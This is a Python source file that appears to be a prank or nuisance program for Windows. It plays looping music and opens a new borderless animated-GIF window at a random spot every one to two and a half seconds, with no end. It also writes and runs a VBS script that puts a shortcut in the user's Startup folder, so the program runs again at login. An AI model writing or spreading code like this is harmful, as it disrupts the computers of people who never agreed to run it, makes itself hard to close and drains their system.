import os
import sys
import time
import random
import tkinter as tk
from tkinter import Toplevel, Label
from pygame import mixer
from PIL import Image, ImageTk, ImageSequence

def play_music():
    mixer.init()
    mixer.music.load(resource_path("audio.mp3"))
    mixer.music.play(-1)

def create_gif_window():
    window = Toplevel()
    window.overrideredirect(True)
    window.geometry("+{}+{}".format(random.randint(0, 800), random.randint(0, 600)))
    label = Label(window)
    label.pack()

    gif = Image.open(resource_path("image.gif"))
    frames = [ImageTk.PhotoImage(frame.copy().convert("RGBA")) for frame in ImageSequence.Iterator(gif)]
    
    def update(ind):
        frame = frames[ind]
        ind += 1
        if ind == len(frames):
            ind = 0
        label.configure(image=frame)
        window.after(100, update, ind)

    window.after(0, update, 0)

def show_gif():
    create_gif_window()
    root.after(random.randint(1000, 2500), show_gif)

def add_to_startup():
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    prysznic_folder = os.path.join(documents_path, "JESTEM W PRYSZNICU")
    if not os.path.exists(prysznic_folder):
        os.makedirs(prysznic_folder)
    
    script = os.path.join(prysznic_folder, "your_script.exe")
    vbs_script = os.path.join(prysznic_folder, "add_to_startup.vbs")
    
    with open(vbs_script, 'w') as f:
        f.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
        f.write(f'strStartupFolder = WshShell.SpecialFolders("Startup")\n')
        f.write(f'strShortcutPath = strStartupFolder & "\\MyPythonScript.lnk"\n')
        f.write(f'Set oShellLink = WshShell.CreateShortcut(strShortcutPath)\n')
        f.write(f'oShellLink.TargetPath = "{script}"\n')
        f.write(f'oShellLink.Save\n')
    
    os.system(f'wscript "{vbs_script}"')

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

if __name__ == "__main__":
    add_to_startup()

    play_music()

    root = tk.Tk()
    root.withdraw()

    show_gif()

    root.mainloop()
